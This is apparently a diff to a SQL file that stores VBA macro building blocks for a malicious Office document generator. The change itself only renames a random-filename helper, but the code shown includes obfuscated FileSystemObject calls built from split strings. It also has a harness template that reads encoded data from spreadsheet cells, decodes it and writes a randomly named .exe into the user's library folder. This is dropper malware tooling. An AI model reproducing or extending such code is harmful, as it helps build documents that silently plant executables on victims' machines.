@@ -160,10 +160,11 @@ End Function
 
 -- 2
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) VALUES ('RandomName', 'util', '
-Function rndname()
+Function GetRnd()
     Dim r As String
     Dim i As Integer
      
+    Randomize
     For i = 1 To 8
         If i Mod 2 = 0 Then
             r = Chr(Int((90 - 65 + 1) * rnd + 65)) & r
@@ -171,7 +172,7 @@ Function rndname()
             r = Int((9 * rnd) + 1) & r
         End If
     Next i
-    rndname = r
+    GetRnd = r
 End Function
 
 ');
@@ -188,8 +189,8 @@ Sub cutil(code As String)
     x = x + "-----E" & "ND CERTIF" & "ICATE-----"
     
     Dim path As String
-    path = Application.UserLibraryPath & rndname & ".txt"
-    expath = Application.UserLibraryPath & rndname & ".exe"
+    path = Application.UserLibraryPath & GetRnd & ".txt"
+    expath = Application.UserLibraryPath & GetRnd & ".exe"
     
     Set scr = CreateObject("Scr" & "ipting.FileSy" & "stemObject")
     Set file = scr.CreateTextFile(path, True)
@@ -284,7 +285,7 @@ INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('SaveToDisk', 'harne
 Sub |RANDOMNAME|()
     Dim p, pth As String
     Dim b
-    pth = Application.UserLibraryPath & rndname & Chr(46) & Chr(101) & Chr(120) & Chr(101)
+    pth = Application.UserLibraryPath & GetRnd & Chr(46) & Chr(101) & Chr(120) & Chr(101)
     p = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
     b = dec(p)
     Call rit(pth, b)
@@ -425,7 +426,7 @@ End Sub
 --15
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('WriteFile', 'util', '
 Function cfile(b As String)
-    pth = Application.UserLibraryPath & rndname & ".txt"
+    pth = Application.UserLibraryPath & GetRnd & ".txt"
     Dim f As Object
     Set f = CreateObject("Sc" & "riptin" & "g.Fil" & "eSyst" & "emObj" & "ect")
     Dim oF As Object
